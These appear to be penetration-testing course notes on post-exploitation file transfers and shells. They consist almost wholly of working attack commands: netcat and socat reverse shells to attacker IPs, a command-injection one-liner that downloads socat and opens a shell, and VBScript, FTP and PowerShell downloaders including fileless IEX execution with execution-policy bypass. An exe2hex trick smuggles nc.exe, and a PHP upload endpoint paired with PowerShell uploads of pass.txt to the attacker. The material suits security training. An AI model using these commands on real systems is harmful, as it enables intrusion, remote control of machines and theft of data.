# Module 16 (File Transfers)

## Generating reverse shell commands <a href="#generating-reverse-shell-commands" id="generating-reverse-shell-commands"></a>

attcker machen

```bash
nc -nvlp 4444 -e /bin/bash
```

victim

```bash
nc -nv 192.168.x.x 4444
```

<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

### Upgrading the shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

#using arrows

#Ctrl + z
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## Method 1: Python pty module <a href="#method-1-python-pty-module" id="method-1-python-pty-module"></a>

One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'                                      
```

```bash
stty raw -echo
```

## Method 2: Using socat <a href="#method-2-using-socat" id="method-2-using-socat"></a>

[socat](http://www.dest-unreach.org/socat/doc/socat.html) is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.

If `socat` is installed on the victim server, you can launch a reverse shell with it. You _must_ catch the connection with `socat` as well to get the full functions.

The following commands will yield a fully interactive TTY reverse shell:

**On Kali (listen)**:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.10:4444
```

Windows File transfer

```bash
sudo apt update && sudo apt install pure-ftpd
```

### FTP configurations.

```bash
#!/bin/bash
if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root"
    exit
fi
sudo apt update && sudo apt install pure-ftpd
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd limbo -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

### FTPd file commands

```bash
echo open 192.168.1.10>> ftp.txt
echo USER hacktor>> ftp.txt
echo hacktor>> ftp.txt
echo bin>> ftp.txt
echo GET nc.exe>> ftp.txt
echo bye>> ftp.txt
```

\#How to run it

```bash
ftp -v -n -s:ftp.txt
```

\#Fixing time out problem\
Code:

```bash
echo "40110 40210" | sudo tee /etc/pure-ftpd/conf/PassivePortRange
sudo service pure-ftpd restart
```

### VBScript to download files

```visual-basic
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

#How to run it 
[code]

cscript wget.vbs http://192.168.1.10/evil.txt evil.txt
```

```bash
upx -9 nc.exe
sudo exe2hex -x  nc.exe  -p nc.cmd
```

### Power shell commands to download files

<pre class="language-powershell"><code class="lang-powershell">echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://192.168.1.10/shell" >>wget.ps1 
echo $file = "shell" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
[code]
#How to run it 
[code]
<strong>powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</strong>[code]

#Powersehll In one line 
[code]
<strong>powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.10/upload.php', 'pass.txt')
</strong>[code]

#On Fly command  --> Run powershell script without downloading it on the hard disk
[code]
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/hello.ps1')
[code]


#Uploading files 
#Preparing kali upload direcotry 
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
</code></pre>

### Save this php code into /var/www/html/

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

### This is how to use it

```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.1.10/upload.php', 'pass.txt')
```
